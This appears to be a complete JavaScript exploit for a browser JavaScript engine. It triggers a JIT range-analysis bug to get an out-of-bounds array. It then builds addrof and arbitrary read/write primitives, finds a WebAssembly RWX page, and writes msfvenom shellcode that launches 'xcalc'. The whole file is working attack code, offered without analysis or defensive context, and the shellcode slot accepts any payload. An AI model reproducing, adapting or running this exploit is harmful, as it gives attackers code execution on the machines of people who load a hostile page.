var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
	    f64_buf[0] = val;
	    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
	    u64_buf[0] = Number(val & 0xffffffffn);
	    u64_buf[1] = Number(val >> 32n);
	    return f64_buf[0];
}

function trigger() {
	  var x = -Infinity;
	  for (var i = 0; i < 1; i += x) {
		if (i == -Infinity)
			x = +Infinity;
	  }
	
	  i = Math.max(i, 1024);
	  i = -i;                
	  i = Math.max(i, -1025); 
	  i = -i;  
	  i -= 1022;              
	  i >>= 1;                
	  i += 1;               

	  let arr = Array(i);
	  oob_arr[0] = 1.1;

	  return arr;
};

for (let i = 0; i < 0x10000; i++) {
	trigger();
}

var oob_arr = trigger();
var flt_arr = [1.1, 1.2];
var obj_arr = [{}, {}];

var flt_map = ftoi(oob_arr[5]) & 0xffffffffn
var obj_map = ftoi(oob_arr[13]) & 0xffffffffn

function addrof(obj) {
	oob_arr[5] = itof(obj_map);
	flt_arr[0] = obj;
	oob_arr[5] = itof(flt_map);
	return ftoi(flt_arr[0]) & 0xffffffffn
}

function arb_read(addr) {
	let old_elements = oob_arr[6]
	oob_arr[6] = itof((2n << 32n) + addr - 8n);
	let leak = flt_arr[0];
	oob_arr[6] = old_elements;
	return leak;
}

function arb_write(addr, val) {
	let old_elements = oob_arr[6]
	oob_arr[6] = itof((2n << 32n) + addr - 8n);
	flt_arr[0] = val;
	oob_arr[6] = old_elements;
}

function exploit() {
	var wasm_code = new Uint8Array([
		0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,
		1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,
		0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,
		128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,
		111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,
		128,0,1,132,128,128,128,0,0,65,0,11
	]);

	var wasm_mod = new WebAssembly.Module(wasm_code);
	var wasm_instance = new WebAssembly.Instance(wasm_mod);
	var f = wasm_instance.exports.main;
	var wasm_instance_addr = addrof(wasm_instance) + 0x68n;
	var rwx_page_addr = arb_read(wasm_instance_addr);

	function copy_shellcode(addr, shellcode) {
		let buf = new ArrayBuffer(0x100);
		let dataview = new DataView(buf);
		let buf_addr = addrof(buf);

		let backing_store_addr = buf_addr + 0x14n;
		arb_write(backing_store_addr, addr);

		for (let i = 0; i < shellcode.length; i++) {
			dataview.setUint32(4 * i, shellcode[i], true);
		}
	}
	
	// msfvenom -p linux/x64/exec CMD='xcalc' --format dword
	var shellcode=[                 
	    0x90909090,
	    0x90909090,
	    0x782fb848,
	    0x636c6163,
	    0x48500000,
	    0x73752fb8,
	    0x69622f72,
	    0x8948506e,
	    0xc03148e7,
	    0x89485750,
	    0xd23148e6,
	    0x3ac0c748,
	    0x50000030,
	    0x4944b848,
	    0x414c5053,
	    0x48503d59,
	    0x3148e289,
	    0x485250c0,
	    0xc748e289,
	    0x00003bc0,
	    0x050f00
	];

	copy_shellcode(rwx_page_addr, shellcode);
	f();
}
exploit();

